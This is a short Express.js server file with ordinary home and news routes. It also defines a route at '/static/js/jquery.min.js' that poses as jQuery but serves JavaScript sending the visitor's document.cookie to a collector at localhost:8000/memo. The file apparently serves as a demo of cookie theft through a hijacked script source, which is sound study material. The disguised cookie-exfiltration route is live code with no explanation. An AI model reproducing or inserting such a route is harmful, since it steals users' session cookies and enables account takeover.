const path = require("path");
const express = require("express");
const morgan = require("morgan");
const handlebars = require("express-handlebars");
const app = express();
const port = 3000;

app.use(morgan("combined"));

app.use(express.static(path.join(__dirname, "public")));

app.engine(
  "hbs",
  handlebars.engine({
    extname: ".hbs",
  })
);
app.set("view engine", "hbs");
app.set("views", path.join(__dirname, "resources", "views"));

app.get("/", (req, res) => {
  res.render("home");
});

app.get("/news", (req, res) => {
  res.render("news");
});

app.get("/static/js/jquery.min.js", (req, res) => {
  res.send(
    "location.href = 'http://localhost:8000/memo?memo='+document.cookie"
  );
});

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`);
});
